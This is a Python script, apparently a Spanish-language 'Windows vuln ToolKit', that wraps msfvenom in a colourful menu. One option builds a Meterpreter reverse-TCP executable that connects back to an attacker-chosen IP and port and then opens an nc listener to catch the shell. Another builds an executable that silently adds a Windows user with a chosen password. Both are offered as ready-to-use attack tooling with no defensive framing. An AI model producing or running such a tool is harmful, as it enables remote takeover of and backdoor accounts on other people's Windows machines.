from colorama import Fore, Back
import os, socket, sys

ip = socket.gethostname()
name = socket.gethostbyname(ip)

class color:
    RED = '\033[31m'
    BLUE = '\033[34m'
    RESET = '\033[39m'

def msf_windows():
    os.system('clear')
    title = '''
\033[31m ██▓███   ▄▄▄     ▓██   ██▓\033[34m ██▓     ▒█████   ▄▄▄      ▓█████▄ 
\033[31m▓██░  ██▒▒████▄    ▒██  ██▒\033[34m▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
\033[31m▓██░ ██▓▒▒██  ▀█▄   ▒██ ██░\033[34m▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
\033[31m▒██▄█▓▒ ▒░██▄▄▄▄██  ░ ▐██▓░\033[34m▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
\033[31m▒██▒ ░  ░ ▓█   ▓██▒ ░ ██▒▓░\033[34m░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
\033[31m▒▓▒░ ░  ░ ▒▒   ▓▒█░  ██▒▒▒ \033[34m░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
\033[31m░▒ ░       ▒   ▒▒ ░▓██ ░▒░ \033[34m░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
\033[31m░░         ░   ▒   ▒ ▒ ░░  \033[34m  ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
\033[31m               ░  ░░ ░     \033[34m    ░  ░    ░ ░        ░  ░   ░    
\033[31m                   ░ ░     \033[34m                            ░     
'''
    print(title)
    print(color.BLUE + color.RESET + '[#] Ingresa la tu IP.')
    attack_ip = input(color.RED + color.RESET + f'[{name}] -->  ')

    print(color.BLUE + color.RESET + '\n[#] Ingresa el puerto.')
    port = input(color.RED + color.RESET + f'[{name}] -->  ')

    print(color.BLUE + color.RESET + '[#] Generando...')
    print('[#]> ---------------------------------------------------------------------------- <[#]')
    os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={attack_ip} LPORT={port} -f exe > windows.exe')
    print('[#]> ---------------------------------------------------------------------------- <[#]')
    os.system(f'nc -lvnp {port}')

def msf_user():
    os.system('clear')
    title = '''
\033[31m ███▄ ▄███▓  ██████   █████\033[34m▒█    ██   ██████ ▓█████  ██▀███  
\033[31m▓██▒▀█▀ ██▒▒██    ▒ ▓██   ▒\033[34m ██  ▓██▒▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒
\033[31m▓██    ▓██░░ ▓██▄   ▒████ ░\033[34m▓██  ▒██░░ ▓██▄   ▒███   ▓██ ░▄█ ▒
\033[31m▒██    ▒██   ▒   ██▒░▓█▒  ░\033[34m▓▓█  ░██░  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  
\033[31m▒██▒   ░██▒▒██████▒▒░▒█░   \033[34m▒▒█████▓ ▒██████▒▒░▒████▒░██▓ ▒██▒
\033[31m░ ▒░   ░  ░▒ ▒▓▒ ▒ ░ ▒ ░   \033[34m░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░
\033[31m░  ░      ░░ ░▒  ░ ░ ░     \033[34m░░▒░ ░ ░ ░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░
\033[31m░      ░   ░  ░  ░   ░ ░   \033[34m ░░░ ░ ░ ░  ░  ░     ░     ░░   ░ 
\033[31m       ░         ░         \033[34m   ░           ░     ░  ░   ░     
'''
    print(title)

    print(color.BLUE + color.RESET + '[#] Ingresa el nombre de usuario a añadir.')
    user = input(color.RED + color.RESET + f'[{name}] -->  ')

    print(color.BLUE + color.RESET + '\n[#] Ingresa la contraseña de dicho usuario.')
    password = input(Fore.RED + Back.RESET + f'[{name}] -->  ')

    print(color.BLUE + color.RESET + '[#] Generando...')
    print('[#]> ---------------------------------------------------------------------------- <[#]')
    os.system(f'msfvenom -p windows/adduser USER={user} PASS={password} -f exe > adduser.exe')
    print('[#]> ---------------------------------------------------------------------------- <[#]')
    print(color.BLUE + color.RESET + 'Presiona ENTER para volver al menú.')
    choice = input(color.RED + color.RESET + f'[{name}] -->  ')
    menu()


def menu():
    os.system('clear')
    title = '''
    \033[31m                                  --:==*.                                                   
    \033[31m                                   -:--+-=-+.                                               
    \033[31m                                   .-----:-#=#+#                                            
    \033[31m+-                                 =---#--#+*%@%##%%%%%#%##%%%#%##*.                        
    \033[31m===+#                             ---**##%%##*#%*#**+##*##***##***#####%##.                 
    \033[31m --==+*#                        -#%%####**#*=*+=+=+=#=#+=++=*=%++*+#+#*##*##%%*             
    \033[31m  -===++**##           -=+*%%*#***++*+=#--*----#----+-%-+=:#-*=:#+**-*-%+%%%%%%@@%*         
    \033[31m   -=++++*+**##%%%%##**#=++#-=:=-.....-..:.:..:..:.+.::.=.::.-.-:-.-=-+*..:::==-@@@@#%.     
    \033[31m   -=+++*#*-+-=:.:.:-:.-::.-.-.-.-..:..=:.....::....=...-=.--.:=-:==*=...-*+=+@:@@*%%%#%=  
    \033[31m     =*++**++====+===--:::-=:::=-:..=:.=:.:.:.::.:.-:.::.---:===:-+*:*..::-*::+%-@%#*--==%#*
    \033[31m     -*++*-+++====------=--==------=+=-=:=---:=::.::::---:=-====-++*++-...=:::-:::*:.:+=+%%.
    \033[31m    .==*+*-*==-::..  ..::::-:----+=:--===-=-:-::::::::-::---=+==+=+=-+:=::+-==.:-...+-#=-.  
    \033[31m   .++++**###.             ---::---------=----:-::-::-:-==-==+====--=-=.:=+-==--:::----.    
    \033[31m  .++=***#*                  :---::::------------:-----------=++****-:--:.::-::-:::::       
    \033[31m .=*++***                     :----:::::::--------------:----=-:=---:::..:.:-::::.          
    \033[31m ==****                        ----==+-  ..:::::::-::::::::::-::::::::::::::                
    \033[31m+++*=                         .--=--:              ...::----==-:::::.                       
    \033[31m+*.                           ----:                     =+++*+                              
    \033[31m                             .-:.                     .====+                                
    \033[31m                                                      --=.                                  
    \033[31m                                                    ..                 

    \033[34m[!] Windows vuln ToolKit by ZombieGeek0.
    '''
    print(title)

    options = '''
    [00]: Salir.
    [01]: Volver al menú.
    [02]: Generar payload con msfvenom para Windows.
    [03]: Añadir usuario en Windows con msfvenom.
    '''
    print(color.BLUE + color.RESET + options)

    choice = input(color.RED + color.RESET + f'[{name}] -->  ')

    if choice == '00':
        os.system('clear')
        print(color.RESET + color.RESET)
        sys.exit()

    elif choice == '01':
        menu()

    elif choice == '02':
        msf_windows()

    elif choice == '03':
        msf_user()

    else:
        print(color.BLUE + color.RESET + '\n[#] Error: Command not found. Presiona ENTER para volver al menú.')
        choice = input(color.RED + color.RESET + f'[{name}] -->  ')
        menu()

menu()
